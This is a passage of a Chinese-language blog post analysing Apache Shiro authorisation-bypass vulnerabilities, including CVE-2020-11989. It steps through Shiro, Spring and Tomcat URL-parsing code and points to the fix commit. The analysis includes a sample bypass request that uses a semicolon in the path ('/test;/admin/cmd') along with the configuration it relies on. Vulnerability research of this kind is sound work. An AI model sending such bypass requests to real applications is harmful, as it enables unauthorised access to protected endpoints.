&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="getpathwithinapplication">getPathWithinApplication</h5>
<p><strong>getPathWithinApplication</strong> 中调用
<strong>getRequestUri</strong> 获取 <strong>URI</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// WebUtils (org.apache.shiro.web.util)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getPathWithinApplication</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">contextPath</span> <span class="operator">=</span> getContextPath(request);</span><br><span class="line">    <span class="type">String</span> <span class="variable">requestUri</span> <span class="operator">=</span> getRequestUri(request);</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.startsWithIgnoreCase(requestUri, contextPath)) &#123;</span><br><span class="line">        <span class="comment">// Normal case: URI contains context path.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> requestUri.substring(contextPath.length());</span><br><span class="line">        <span class="keyword">return</span> (StringUtils.hasText(path) ? path : <span class="string">&quot;/&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Special case: rather unusual.</span></span><br><span class="line">        <span class="keyword">return</span> requestUri;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="getrequesturi">getRequestUri</h5>
<p><strong>getRequestUri</strong> 传入
<strong>decodeAndCleanUriString</strong> 进行一些格式化处理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// WebUtils (org.apache.shiro.web.util)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getRequestUri</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> (String) request.getAttribute(INCLUDE_REQUEST_URI_ATTRIBUTE);</span><br><span class="line">    <span class="keyword">if</span> (uri == <span class="literal">null</span>) &#123;</span><br><span class="line">        uri = request.getRequestURI();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> decodeAndCleanUriString(request, uri);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="decodeandcleanuristring">decodeAndCleanUriString</h5>
<p><strong>decodeAndCleanUriString</strong> 按 <strong>;</strong>
分割，返回。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">decodeAndCleanUriString</span><span class="params">(HttpServletRequest request, String uri)</span> &#123;</span><br><span class="line">    uri = decodeRequestString(request, uri);</span><br><span class="line">    <span class="type">int</span> <span class="variable">semicolonIndex</span> <span class="operator">=</span> uri.indexOf(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> (semicolonIndex != -<span class="number">1</span> ? uri.substring(<span class="number">0</span>, semicolonIndex) : uri);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="proxy">proxy</h5>
<p><strong>proxy</strong> 中根据 <strong>chainName</strong> 获取到
<strong>anno</strong> 路由。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> FilterChain <span class="title function_">proxy</span><span class="params">(FilterChain original, String chainName)</span> &#123;</span><br><span class="line">    <span class="type">NamedFilterList</span> <span class="variable">configured</span> <span class="operator">=</span> getChain(chainName);</span><br><span class="line">    <span class="keyword">if</span> (configured == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;There is no configured chain under the name/key [&quot;</span> + chainName + <span class="string">&quot;].&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> configured.proxy(original);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img
src="/images/Study-Unauthorized-Shiro/image-20230616151007411.png" /></p>
<h4 id="tomcat-处理部分">Tomcat 处理部分</h4>
<h5 id="gethandlerinternal">getHandlerInternal</h5>
<p><strong>getHandlerInternal</strong> 使用
<strong>getLookupPathForRequest</strong> 转
<strong>getPathWithinServletMapping</strong> 调用
<strong>getServletPath</strong> 返回的是
<strong>/admin/whoami</strong>。</p>
<p>然后 <strong>getHandlerInternal</strong> 使用
<strong>lookupHandlerMethod</strong> 方法，而
<strong>lookupHandlerMethod</strong> 调用
<strong>addMatchingMappings</strong> 匹配到
<strong>/admin/{name}</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AbstractHandlerMethodMapping (org.springframework.web.servlet.handler)</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> HandlerMethod <span class="title function_">getHandlerInternal</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 使用 getLookupPathForRequest 转 getPathWithinServletMapping 调用 getServletPath 返回的是 /admin/whoami。</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">lookupPath</span> <span class="operator">=</span> getUrlPathHelper().getLookupPathForRequest(request);</span><br><span class="line">    request.setAttribute(LOOKUP_PATH, lookupPath);</span><br><span class="line">    <span class="built_in">this</span>.mappingRegistry.acquireReadLock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// lookupHandlerMethod 调用 addMatchingMappings 匹配到 /admin/&#123;name&#125;。</span></span><br><span class="line">        <span class="type">HandlerMethod</span> <span class="variable">handlerMethod</span> <span class="operator">=</span> lookupHandlerMethod(lookupPath, request);</span><br><span class="line">        <span class="keyword">return</span> (handlerMethod != <span class="literal">null</span> ? handlerMethod.createWithResolvedBean() : <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.mappingRegistry.releaseReadLock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="getpathwithinservletmapping">getPathWithinServletMapping</h5>
<p><strong>getPathWithinServletMapping</strong> 最后返回的是
<strong>getServletPath</strong> 的值。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// UrlPathHelper (org.springframework.web.util)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getPathWithinServletMapping</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">pathWithinApp</span> <span class="operator">=</span> getPathWithinApplication(request);</span><br><span class="line">    <span class="type">String</span> <span class="variable">servletPath</span> <span class="operator">=</span> getServletPath(request);</span><br><span class="line">    <span class="type">String</span> <span class="variable">sanitizedPathWithinApp</span> <span class="operator">=</span> getSanitizedPath(pathWithinApp);</span><br><span class="line">    String path;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If the app container sanitized the servletPath, check against the sanitized version</span></span><br><span class="line">    <span class="keyword">if</span> (servletPath.contains(sanitizedPathWithinApp)) &#123;</span><br><span class="line">        path = getRemainingPath(sanitizedPathWithinApp, servletPath, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        path = getRemainingPath(pathWithinApp, servletPath, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (path != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Normal case: URI contains servlet path.</span></span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Special case: URI is different from servlet path.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">pathInfo</span> <span class="operator">=</span> request.getPathInfo();</span><br><span class="line">        <span class="keyword">if</span> (pathInfo != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// Use path info if available. Indicates index page within a servlet mapping?</span></span><br><span class="line">            <span class="comment">// e.g. with index page: URI=&quot;/&quot;, servletPath=&quot;/index.html&quot;</span></span><br><span class="line">            <span class="keyword">return</span> pathInfo;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.urlDecode) &#123;</span><br><span class="line">            <span class="comment">// No path info... (not mapped by prefix, nor by extension, nor &quot;/*&quot;)</span></span><br><span class="line">            <span class="comment">// For the default servlet mapping (i.e. &quot;/&quot;), urlDecode=false can</span></span><br><span class="line">            <span class="comment">// cause issues since getServletPath() returns a decoded path.</span></span><br><span class="line">            <span class="comment">// If decoding pathWithinApp yields a match just use pathWithinApp.</span></span><br><span class="line">            path = getRemainingPath(decodeInternal(request, pathWithinApp), servletPath, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (path != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> pathWithinApp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Otherwise, use the full servlet path.</span></span><br><span class="line">        <span class="keyword">return</span> servletPath;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="getservletpath">getServletPath</h5>
<p>跟进 <strong>getServletPath</strong>，可见是调用了映射处理时候封装的
<strong>wrapperPath</strong> 成员变量，而 <strong>wrapperPath</strong>
在解析 <strong>HTTP</strong> 请求的时候就处理过，其中的
<strong>/./</strong> 被替换为空，因此返回了
<strong>/admin/whoami</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Request (org.apache.catalina.connector)</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getServletPath</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> mappingData.wrapperPath.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="lookuphandlermethod">lookupHandlerMethod</h5>
<p>最后在 <strong>lookupHandlerMethod</strong> 的
<strong>addMatchingMappings</strong> 方法中匹配到
<strong>/admin/{name}</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AbstractHandlerMethodMapping (org.springframework.web.servlet.handler)</span></span><br><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">protected</span> HandlerMethod <span class="title function_">lookupHandlerMethod</span><span class="params">(String lookupPath, HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    List&lt;Match&gt; matches = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    List&lt;T&gt; directPathMatches = <span class="built_in">this</span>.mappingRegistry.getMappingsByUrl(lookupPath);</span><br><span class="line">    <span class="keyword">if</span> (directPathMatches != <span class="literal">null</span>) &#123;</span><br><span class="line">        addMatchingMappings(directPathMatches, matches, request);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (matches.isEmpty()) &#123;</span><br><span class="line">        <span class="comment">// No choice but to go through all mappings...</span></span><br><span class="line">        addMatchingMappings(<span class="built_in">this</span>.mappingRegistry.getMappings().keySet(), matches, request);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!matches.isEmpty()) &#123;</span><br><span class="line">        <span class="type">Match</span> <span class="variable">bestMatch</span> <span class="operator">=</span> matches.get(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (matches.size() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            Comparator&lt;Match&gt; comparator = <span class="keyword">new</span> <span class="title class_">MatchComparator</span>(getMappingComparator(request));</span><br><span class="line">            matches.sort(comparator);</span><br><span class="line">            bestMatch = matches.get(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">                logger.trace(matches.size() + <span class="string">&quot; matching mappings: &quot;</span> + matches);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (CorsUtils.isPreFlightRequest(request)) &#123;</span><br><span class="line">                <span class="keyword">return</span> PREFLIGHT_AMBIGUOUS_MATCH;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Match</span> <span class="variable">secondBestMatch</span> <span class="operator">=</span> matches.get(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (comparator.compare(bestMatch, secondBestMatch) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> bestMatch.handlerMethod.getMethod();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">m2</span> <span class="operator">=</span> secondBestMatch.handlerMethod.getMethod();</span><br><span class="line">                <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> request.getRequestURI();</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(</span><br><span class="line">                        <span class="string">&quot;Ambiguous handler methods mapped for &#x27;&quot;</span> + uri + <span class="string">&quot;&#x27;: &#123;&quot;</span> + m1 + <span class="string">&quot;, &quot;</span> + m2 + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        request.setAttribute(BEST_MATCHING_HANDLER_ATTRIBUTE, bestMatch.handlerMethod);</span><br><span class="line">        handleMatch(bestMatch.mapping, lookupPath, request);</span><br><span class="line">        <span class="keyword">return</span> bestMatch.handlerMethod;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> handleNoMatch(<span class="built_in">this</span>.mappingRegistry.getMappings().keySet(), lookupPath, request);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img
src="/images/Study-Unauthorized-Shiro/image-20230616153030512.png" /></p>
<h2 id="漏洞修复">漏洞修复</h2>
<p><strong>Shiro</strong> 在 <a
href="https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34"><strong>Commit</strong></a>
中新增了 <strong>normalize</strong> 方法用于格式化。</p>
<p><img
src="/images/Study-Unauthorized-Shiro/github.com_apache_shiro_commit_ab8294940a19743583d91f0c7e29b405d197cc34.png" /></p>
<h1 id="cve-2016-6802">CVE-2016-6802</h1>
<h1 id="cve-2020-1957">CVE-2020-1957</h1>
<h1 id="cve-2020-11989">CVE-2020-11989</h1>
<h2 id="漏洞简介-1">漏洞简介</h2>
<p>影响版本：<strong>shiro &lt; 1.5.3</strong></p>
<p>漏洞描述：在 <strong>Shiro &lt; 1.5.3</strong> 的情况下，将
<strong>Shiro</strong> 与 <strong>Spring Controller</strong>
一起使用时，由于对 <strong>URL</strong>
解析的不同操作，匹配到不同的过滤链，导致权限绕过。</p>
<p>测试环境：<strong>Shiro 1.5.2</strong>，<strong>SpringBoot
2.2.6.RELEASE</strong></p>
<h2 id="漏洞分析-1">漏洞分析</h2>
<p>为了修复 <strong>CVE-2020-1957</strong>,<strong>shiro</strong> 在
<strong>1.5.2</strong> 版本进行了更新，将
<strong>request.getRequestURI()</strong> 修改为
<strong>request.getContextPath()</strong>、<strong>request.getServletPath()</strong>、<strong>request.getPathInfo()</strong>
拼接构造 <strong>URI</strong>。</p>
<h3 id="context-path-绕过">context-path 绕过</h3>
<p>配置如下。</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># application.properties</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="string">9090</span></span><br><span class="line"><span class="attr">server.servlet.context-path</span>=<span class="string">/test</span></span><br></pre></td></tr></table></figure>
<p><strong>HTTP</strong> 请求如下。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET http://127.0.0.1:9090/test;/admin/cmd</span><br></pre></td></tr></table></figure>
<h4 id="shiro-处理部分-1">Shiro 处理部分</h4>
<h5 id="executechain">executeChain</h5>
<p>从 <strong>executeChain</strong> 方法开始，执行过滤链，先调用
<strong>getExecutionChain</strong> 方法获取 <strong>Shiro</strong>
配置的过滤链，然后执行 <strong>doFilter</strong> 方法进行过滤。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AbstractShiroFilter (org.apache.shiro.web.servlet)</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">executeChain</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain origChain)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    <span class="type">FilterChain</span> <span class="variable">chain</span> <span class="operator">=</span> getExecutionChain(request, response, origChain);</span><br><span class="line">    chain.doFilter(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="getexecutionchain">getExecutionChain</h5>
<p>从 <strong>getFilterChainResolver</strong> 方法获取解析器，然后调用
<strong>getChain</strong> 根据 <strong>URL</strong> 获取要执行的链。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AbstractShiroFilter (org.apache.shiro.web.servlet)</span></span><br><span class="line"><span class="keyword">protected</span> FilterChain <span class="title function_">getExecutionChain</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain origChain)</span> &#123;</span><br><span class="line">    <span class="type">FilterChain</span> <span class="variable">chain</span> <span class="operator">=</span> origChain;</span><br><span class="line"></span><br><span class="line">    <span class="type">FilterChainResolver</span> <span class="variable">resolver</span> <span class="operator">=</span> getFilterChainResolver();</span><br><span class="line">    <span class="keyword">if</span> (resolver == <span class="literal">null</span>) &#123;</span><br><span class="line">        log.debug(<span class="string">&quot;No FilterChainResolver configured.  Returning original FilterChain.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> origChain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">FilterChain</span> <span class="variable">resolved</span> <span class="operator">=</span> resolver.getChain(request, response, origChain);</span><br><span class="line">    <span class="keyword">if</span> (resolved != <span class="literal">null</span>) &#123;</span><br><span class="line">        log.trace(<span class="string">&quot;Resolved a configured FilterChain for the current request.&quot;</span>);</span><br><span class="line">        chain = resolved;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        log.trace(<span class="string">&quot;No FilterChain configured for the current request.  Using the default.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> chain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="getchain-1">getChain</h5>
<p>调用 <strong>getPathWithinApplication</strong> 方法拿到
<strong>requestURI</strong> 为 <strong>/test</strong> ，去匹配
<strong>shiroFilterFactoryBean</strong>中 的
<strong>filter</strong>，匹配不到，返回为空。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PathMatchingFilterChainResolver (org.apache.shiro.web.filter.mgt)</span></span><br><span class="line"><span class="keyword">public</span> FilterChain <span class="title function_">getChain</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain originalChain)</span> &#123;</span><br><span class="line">    <span class="type">FilterChainManager</span> <span class="variable">filterChainManager</span> <span class="operator">=</span> getFilterChainManager();</span><br><span class="line">    <span class="keyword">if</span> (!filterChainManager.hasChains()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 获取到的URI为 &quot;/test&quot;</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">requestURI</span> <span class="operator">=</span> getPathWithinApplication(request); <span class="comment">// requestURI: &quot;/test&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 防止 &quot;/resource/menus&quot; 绕过 &quot;/resource/menus/&quot; 的保护</span></span><br><span class="line">    <span class="keyword">if</span>(requestURI != <span class="literal">null</span> &amp;&amp; !DEFAULT_PATH_SEPARATOR.equals(requestURI)</span><br><span class="line">            &amp;&amp; requestURI.endsWith(DEFAULT_PATH_SEPARATOR)) &#123;</span><br><span class="line">        requestURI = requestURI.substring(<span class="number">0</span>, requestURI.length() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  [&quot;/doLogin&quot;, &quot;/admin/*&quot;]</span></span><br><span class="line">    <span class="keyword">for</span> (String pathPattern : filterChainManager.getChainNames()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pathPattern != <span class="literal">null</span> &amp;&amp; !DEFAULT_PATH_SEPARATOR.equals(pathPattern)</span><br><span class="line">                &amp;&amp; pathPattern.endsWith(DEFAULT_PATH_SEPARATOR)) &#123;</span><br><span class="line">            pathPattern = pathPattern.substring(<span class="number">0</span>, pathPattern.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (pathMatches(pathPattern, requestURI)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                log.trace(<span class="string">&quot;Matched path pattern [&quot;</span> + pathPattern + <span class="string">&quot;] for requestURI [&quot;</span> + Encode.forHtml(requestURI) + <span class="string">&quot;].  &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;Utilizing corresponding filter chain...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> filterChainManager.proxy(originalChain, pathPattern);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="getpathwithinapplication-1">getPathWithinApplication</h5>
<p>之所以在 <strong>getChain</strong> 中匹配不到，是因为
<strong>getPathWithinApplication</strong> 获取 <strong>URI</strong>
中部署路径之后的路径，例如 <strong>context-path</strong> 为
<strong>/test/</strong> 的时候 <strong>/test/admin/cmd</strong> 返回
<strong>/admin/cmd</strong>, 而 <strong>/test;/admin/cmd</strong>
由于解析差异则返回了 <strong>/test</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// WebUtils (org.apache.shiro.web.util)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getPathWithinApplication</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="comment">// 获取当前Web应用程序的上下文路径</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">contextPath</span> <span class="operator">=</span> getContextPath(request); <span class="comment">// contextPath: &quot;/test;&quot;</span></span><br><span class="line">    <span class="comment">// 获取当前请求的请求URI</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">requestUri</span> <span class="operator">=</span> getRequestUri(request); <span class="comment">// requestUri: &quot;/test&quot;</span></span><br><span class="line">    <span class="comment">// 检查请求URI是否以上下文路径开头</span></span><br><span class="line">    <span class="comment">// 如果 &quot;/test/admin/cmd&quot; 则最后会返回 &quot;/admin/cmd&quot;， 而 &quot;/test;/admin/cmd&quot; 由于解析差异则返回了 &quot;/test&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (StringUtils.startsWithIgnoreCase(requestUri, contextPath)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> requestUri.substring(contextPath.length());</span><br><span class="line">        <span class="keyword">return</span> (StringUtils.hasText(path) ? path : <span class="string">&quot;/&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> requestUri; <span class="comment">// requestUri: &quot;/test&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="getcontextpath">getContextPath</h5>
<p>返回给定请求的上下文路径，即前两个 <strong>/</strong> 之间的参数
<strong>/test;</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getContextPath</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">lastSlash</span> <span class="operator">=</span> mappingData.contextSlashCount;</span><br><span class="line">    <span class="comment">// Special case handling for the root context</span></span><br><span class="line">    <span class="keyword">if</span> (lastSlash == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">canonicalContextPath</span> <span class="operator">=</span> getServletContext().getContextPath(); <span class="comment">// canonicalContextPath: &quot;/test&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> getRequestURI(); <span class="comment">// uri: &quot;/test;/admin/cmd&quot;</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">pos</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!getContext().getAllowMultipleLeadingForwardSlashInPath()) &#123;</span><br><span class="line">        <span class="comment">// 确保以 &quot;/&quot; 开头</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            pos++;</span><br><span class="line">        &#125; <span class="keyword">while</span> (pos &lt; uri.length() &amp;&amp; uri.charAt(pos) == <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        pos--;</span><br><span class="line">        uri = uri.substring(pos);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>[] uriChars = uri.toCharArray(); <span class="comment">// uriChars: [/, t, e, s, t, ;, /, a, d, m, i, n, /, c, m, d]</span></span><br><span class="line">    <span class="comment">// Need at least the number of slashes in the context path</span></span><br><span class="line">    <span class="keyword">while</span> (lastSlash &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        pos = nextSlash(uriChars, pos + <span class="number">1</span>); <span class="comment">// pos: 6</span></span><br><span class="line">        <span class="keyword">if</span> (pos == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        lastSlash--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 规范化路径</span></span><br><span class="line">    String candidate;</span><br><span class="line">    <span class="keyword">if</span> (pos == -<span class="number">1</span>) &#123;</span><br><span class="line">        candidate = uri;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        candidate = uri.substring(<span class="number">0</span>, pos); <span class="comment">// candidate: &quot;/test;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 移除 &quot;;&quot; 返回 &quot;/test&quot;</span></span><br><span class="line">    candidate = removePathParameters(candidate); </span><br><span class="line">    <span class="comment">// URL解码</span></span><br><span class="line">    candidate = UDecoder.URLDecode(candidate, connector.getURICharset());</span><br><span class="line">    <span class="comment">// 替换 &quot;\\&quot; 为 &quot;/&quot;, 若URL不以 &quot;/&quot; 开头则加上，替换 &quot;//&quot;、&quot;/./&quot;、&quot;/../&quot; 为 &quot;/&quot;</span></span><br><span class="line">    candidate = org.apache.tomcat.util.http.RequestUtil.normalize(candidate);</span><br><span class="line">    <span class="comment">// 检测处理前后是否相等</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">match</span> <span class="operator">=</span> canonicalContextPath.equals(candidate);</span><br><span class="line">    <span class="keyword">while</span> (!match &amp;&amp; pos != -<span class="number">1</span>) &#123;</span><br><span class="line">        pos = nextSlash(uriChars, pos + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (pos == -<span class="number">1</span>) &#123;</span><br><span class="line">            candidate = uri;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            candidate = uri.substring(<span class="number">0</span>, pos);</span><br><span class="line">        &#125;</span><br><span class="line">        candidate = removePathParameters(candidate);</span><br><span class="line">        candidate = UDecoder.URLDecode(candidate, connector.getURICharset());</span><br><span class="line">        candidate = org.apache.tomcat.util.http.RequestUtil.normalize(candidate);</span><br><span class="line">        match = canonicalContextPath.equals(candidate);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (match) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pos == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> uri;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> uri.substring(<span class="number">0</span>, pos); <span class="comment">// return: &quot;/test;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Should never happen</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(sm.getString(</span><br><span class="line">                <span class="string">&quot;coyoteRequest.getContextPath.ise&quot;</span>, canonicalContextPath, uri));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="getrequesturi-1">getRequestUri</h5>
<p><strong>Shiro</strong> 中获取的 <strong>URI</strong> 还未经
<strong>servlet</strong> 解码，因此需要解码一次，对于如
<strong>JBoss/Jetty</strong> 等容器，在 <strong>URI</strong> 使用如
<strong>;jsessionid</strong> 样式进行传参，因此需要进行截断，返回
<strong>/test</strong>。</p>
